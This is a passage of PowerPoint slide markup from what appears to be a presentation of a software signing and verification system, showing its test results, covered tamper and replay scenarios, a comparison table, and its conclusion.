                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python demo.py</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5760720"/>
            <a:ext cx="5623560" cy="4572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457200" y="5779008"/>
            <a:ext cx="5486400" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Safe: local only · exfiltration URL uses .invalid · tampered script is never executed</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Testing Results</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="1984248"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365760" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>25 / 25</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="438912" y="2167128"/>
            <a:ext cx="1837943" cy="548640"/>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automated tests passed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2496312" y="1371600"/>
            <a:ext cx="1984248"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2496312" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>14 / 14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2569464" y="2167128"/>
            <a:ext cx="1837943" cy="548640"/>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attack scenarios as expected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4626864" y="1371600"/>
            <a:ext cx="1984248"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4626864" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0 %</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4700016" y="2167128"/>
            <a:ext cx="1837943" cy="548640"/>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false acceptance (1,000 tampered)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757416" y="1371600"/>
            <a:ext cx="1984248" cy="137160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6757416" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>2.2 ms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6830568" y="2167128"/>
            <a:ext cx="1837943" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>per full verification</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 16" descr="verification_cost.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2926080"/>
            <a:ext cx="5394960" cy="2922270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rounded Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="2926080"/>
            <a:ext cx="2834640" cy="292608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6053328" y="2971800"/>
            <a:ext cx="2651760" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Covered test cases</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Valid artifact → PASS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Modified artifact / manifest → BLOCK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Invalid signature, wrong key → BLOCK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Revoked key, replay → BLOCK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Unauthorised signer → DENIED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS 1.2 downgrade → refused</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit-log edit → chain BROKEN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>New release after rotation → PASS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Innovation &amp; Industry Relevance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1371600"/>
          <a:ext cx="8412480" cy="3145536"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="2743200"/>
                <a:gridCol w="1645920"/>
                <a:gridCol w="1645920"/>
                <a:gridCol w="2377440"/>
              </a:tblGrid>
              <a:tr h="393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Capability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50" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Checksum file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50" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Signature only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c>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Our system</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1F3864"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Detects modified artifact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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Only if checked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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Survives registry compromise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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Key rotation / revocation</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Manual</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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: signed trust policy</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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Blocks replay of old versions</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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: anti-rollback</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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Build provenance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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: signed</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r h="393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Stolen-key defence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c>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: MFA + scan + revoke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4F6F9"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Automatic CI enforcement</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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>No</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Often manual</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c>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: fail-closed gate</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="22860" marB="22860" anchor="ctr">
                    <a:lnL w="6350">
                      <a:solidFill>
                        <a:srgbClr val="C5CDD6"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="6350">
                      <a:solidFill>
                        <a:srgbClr val="C5CDD6"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="6350">
                      <a:solidFill>
                        <a:srgbClr val="C5CDD6"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="6350">
                      <a:solidFill>
                        <a:srgbClr val="C5CDD6"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4709160"/>
            <a:ext cx="4114800" cy="1234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475488" y="4754880"/>
            <a:ext cx="393192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Industry alignment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="5102352"/>
            <a:ext cx="3931920" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>US EO 14028 · NIST SSDF (SP 800-218) · SLSA provenance · Sigstore · TUF / in-toto</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="4709160"/>
            <a:ext cx="4114800" cy="1234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4773168" y="4754880"/>
            <a:ext cx="3931920" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cost &amp; feasibility</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="5102352"/>
            <a:ext cx="3931920" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Open-source (PyCA, OpenSSL, SQLite) · ~2 ms per check · cloud KMS key for production</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Conclusion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E3F4EA"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="94C9A9"/>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02920" y="1417320"/>
            <a:ext cx="8138160" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>LEGITIMATE SOFTWARE → VERIFIED → DEPLOYED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>TAMPERED SOFTWARE → DETECTED → BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2697480"/>
            <a:ext cx="2697480" cy="3520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475488" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Achieved</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Integrity + authenticity verified on every download</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Signing protected by RBAC + MFA (HSM/KMS concept)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Rotation, revocation, anti-replay via signed policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
